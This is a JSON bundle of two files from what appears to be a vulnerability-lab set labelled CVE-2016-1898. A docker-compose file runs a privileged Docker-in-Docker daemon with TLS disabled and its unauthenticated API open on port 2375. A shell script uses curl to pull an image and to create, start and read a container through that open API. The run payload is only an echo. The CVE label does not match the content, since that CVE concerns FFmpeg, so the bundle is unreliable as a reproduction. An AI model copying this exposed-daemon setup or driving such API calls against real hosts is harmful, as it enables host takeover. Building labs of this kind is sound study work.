{
    "files": [
        {
            "location": "./../../dockers/CVE-2016-1898/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\nservices:\n  vulnerable-docker:\n    image: docker:20.10-dind\n    privileged: true\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    ports:\n      - \"2375:2375\"\n    volumes:\n      - dockerd-data:/var/lib/docker\n\n  exploit:\n    image: alpine:3.18\n    depends_on:\n      - vulnerable-docker\n    volumes:\n      - ./exploit.sh:/exploit.sh\n    entrypoint: \"sh -c 'apk add --no-cache curl jq && chmod +x /exploit.sh && sh /exploit.sh'\"\n\nvolumes:\n  dockerd-data: {}"
        },
        {
            "location": "./../../dockers/CVE-2016-1898/custom_no_tool/exploit.sh",
            "content": "#!/bin/sh\nset -e\n\nHOST=\"vulnerable-docker\"\nPORT=\"2375\"\n\n# Wait until the Docker daemon inside DinD is ready (up to 30 seconds).\nwait_for_docker() {\n  for i in $(seq 1 30); do\n    if curl -s \"http://${HOST}:${PORT}/_ping\" | grep -q 'OK'; then\n      return 0\n    fi\n    sleep 1\n  done\n  echo \"Docker daemon did not become ready\" >&2\n  exit 1\n}\n\nwait_for_docker\n\n# Pull a minimal Alpine image from Docker Hub\ncurl -s -X POST \"http://${HOST}:${PORT}/images/create?fromImage=alpine&tag=3.18\" > /dev/null\n\n# Create a container and capture its full ID\nCID=$(curl -s -X POST \"http://${HOST}:${PORT}/containers/create?name=demo\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"Image\":\"alpine:3.18\",\"Cmd\":[\"sh\",\"-c\",\"echo Hello from DinD\"]}' | jq -r .Id)\n\n# Start the container using the captured ID\ncurl -s -X POST \"http://${HOST}:${PORT}/containers/${CID}/start\" > /dev/null\n\n# Retrieve and display the container's output logs\ncurl -s \"http://${HOST}:${PORT}/containers/${CID}/logs?stdout=1&stderr=1\"\n"
        }
    ],
    "directory_tree": "CVE-2016-1898/custom_no_tool"
}